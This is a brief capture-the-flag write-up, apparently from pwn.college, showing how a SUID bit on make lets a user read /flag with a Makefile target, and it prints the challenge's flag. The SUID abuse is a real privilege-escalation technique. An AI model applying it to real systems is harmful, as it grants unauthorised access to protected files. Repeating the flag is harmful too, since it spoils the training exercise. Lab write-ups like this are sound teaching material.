The SUID bit on `/usr/bin/make` is set. Create a `Makefile` in the current directory with the following text:
```
test:
    cat /flag
```
Make sure you're using a tab on the second line. Now simply run:
```
$ make
```
And the flag `pwn.college{gkiu41WV74QJRQNk7EeEcmD5Gnk.0FO2EDLyYjNyEzW}` will be printed as part of the output of `cat /flag`
